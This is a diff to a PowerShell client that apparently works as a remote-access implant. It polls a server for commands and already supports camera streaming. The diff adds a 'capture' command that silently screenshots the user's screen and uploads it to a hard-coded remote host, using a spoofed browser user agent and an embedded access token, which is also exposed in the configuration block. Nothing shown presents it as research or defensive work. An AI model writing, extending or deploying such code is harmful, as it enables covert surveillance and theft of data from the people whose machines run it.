@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.1.9"
+$Version = "3.2.0"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -1213,6 +1213,43 @@ function Connect-Cloudflare {
                 if ($command -eq "stopstream") {
                     Stop-CameraStream
                     Send-Result-To-Server -Body "[*] Camera stream stopped`n"
+                    Start-Sleep -Milliseconds $activeDelay
+                    continue
+                }
+
+                if ($command -eq "capture") {
+                    try {
+                        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+                        $s   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                        $bmp = New-Object System.Drawing.Bitmap($s.Width, $s.Height)
+                        $g   = [System.Drawing.Graphics]::FromImage($bmp)
+                        $g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size)
+                        $g.Dispose()
+                        $ms  = New-Object System.IO.MemoryStream
+                        $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
+                        $encParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
+                        $encParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 85L)
+                        $bmp.Save($ms, $jpegCodec, $encParams)
+                        $bmp.Dispose()
+                        $jpegBytes = $ms.ToArray()
+                        $ms.Dispose()
+                        $captureUrl = "$cfHost/capture_frame?id=$clientId"
+                        $req = [System.Net.HttpWebRequest]::Create($captureUrl)
+                        $req.Method          = 'POST'
+                        $req.ContentType     = 'image/jpeg'
+                        $req.ContentLength   = $jpegBytes.Length
+                        $req.Timeout         = 15000
+                        $req.ReadWriteTimeout = 15000
+                        $req.UserAgent       = 'Mozilla/5.0'
+                        $req.Headers.Add('X-Token', $cfToken)
+                        $rs2 = $req.GetRequestStream()
+                        $rs2.Write($jpegBytes, 0, $jpegBytes.Length)
+                        $rs2.Close()
+                        $req.GetResponse().Close()
+                        Send-Result-To-Server -Body "[+] Screenshot captured. View at: $cfHost/capture_view?id=$clientId`n"
+                    } catch {
+                        Send-Result-To-Server -Body "[!] Capture failed: $($_.Exception.Message)`n"
+                    }
                     Start-Sleep -Milliseconds $activeDelay
                     continue
                 }
